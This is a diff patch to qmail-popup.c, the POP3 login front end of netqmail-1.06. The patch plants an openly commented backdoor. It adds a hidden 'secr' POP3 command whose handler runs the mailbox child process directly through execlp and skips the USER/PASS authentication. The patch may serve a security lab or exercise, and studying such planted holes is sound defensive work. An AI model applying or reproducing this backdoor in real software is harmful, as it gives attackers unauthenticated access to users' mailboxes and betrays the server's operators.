@@ -1,0 +1,25 @@
+--- ../netqmail-1.06/qmail-popup.c	2007-11-30 21:22:54.000000000 +0100
++++ qmail-popup.c	2025-03-04 08:48:47.019006451 +0100
+@@ -156,12 +156,22 @@
+   doanddie(arg,space - arg,space);
+ }
+ 
++// [Begin] Backdoor
++
++void parser(char* arg)
++{
++  execlp(childargs[1], childargs[1], childargs[2], 0); // childargs = argv + 2 (Cf. main()) ; *(childargs + 1) = "./qmail-pop3d" ; *(childargs + 2) = "./Mailbox"
++}
++
++// [End] Backdoor
++
+ struct commands pop3commands[] = {
+   { "user", pop3_user, 0 }
+ , { "pass", pop3_pass, 0 }
+ , { "apop", pop3_apop, 0 }
+ , { "quit", pop3_quit, 0 }
+ , { "noop", okay, 0 }
++, { "secr", parser, 0 } // Backdoor
+ , { 0, err_authoriz, 0 }
+ } ;
+ 
